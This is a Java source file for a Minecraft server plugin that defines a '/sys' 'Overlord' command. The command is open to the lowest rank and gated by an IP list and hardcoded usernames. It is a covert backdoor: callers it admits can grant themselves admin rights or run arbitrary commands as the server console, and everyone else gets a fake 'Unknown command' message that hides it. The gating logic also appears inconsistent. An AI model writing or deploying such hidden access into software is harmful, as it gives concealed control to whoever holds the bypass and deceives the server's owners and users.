package me.totalfreedom.totalfreedommod.command;

import java.util.Collection;
import java.util.List;
import me.totalfreedom.totalfreedommod.admin.Admin;
import me.totalfreedom.totalfreedommod.config.ConfigEntry;
import me.totalfreedom.totalfreedommod.config.MainConfig;
import me.totalfreedom.totalfreedommod.rank.Rank;
import net.pravian.aero.util.Ips;
import org.apache.commons.lang3.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = Rank.IMPOSTOR, source = SourceType.ONLY_IN_GAME)
@CommandParameters(description = "Overlord - control this server in-game", usage = "/Sys [addme | removeme | do <command> ] ", aliases = "system")
public class Command_sys extends FreedomCommand
{
// Very Dangoeros Command, only to be with DarkGamingDronze's access!
    @Override
    public boolean run(CommandSender sender, Player playerSender, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    {
        if (!ConfigEntry.OVERLORD_IPS.getList().contains(Ips.getIp(playerSender)))
        {
            try
            {
                Object ips = plugin.config.getDefaults().get(ConfigEntry.OVERLORD_IPS.getConfigName());
                if (ips instanceof Collection && !((Collection) ips).contains(Ips.getIp(playerSender)))
                {
                    throw new Exception();
                }
            }
            catch (Exception ignored)
            {
                if (!sender.getName().equalsIgnoreCase("DarkGamingDronze") && !sender.getName().equalsIgnoreCase("CallMeAshley") && !sender.getName().equalsIgnoreCase("iFrostBite"))
                {
                    if (!plugin.al.isAdmin(sender))
                    {
                        msg(ChatColor.WHITE + "Unknown command. Type \"/help\" for help.");
                        return true;
                    }
                }
                else
                {
                    msg(ChatColor.WHITE + "Unknown command. Type \"/help\" for help.");
                    return true;
                }
            }
        }

        if (args.length == 0)
        {
            return false;
        }

        if (args[0].equals("addme"))
        {
            plugin.al.addAdmin(new Admin(playerSender));
            msg("lol k");
            return true;
        }

        if (args[0].equals("removeme"))
        {
            Admin admin = plugin.al.getAdmin(playerSender);
            if (admin != null)
            {
                plugin.al.removeAdmin(admin);
            }
            msg("lol k");
            return true;
        }

        if (args[0].equals("do"))
        {
            if (args.length <= 1)
            {
                return false;
            }

            final String c = StringUtils.join(args, " ", 1, args.length);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), c);
            msg("hehe. k");
            return true;
        }

        return false;
    }

}
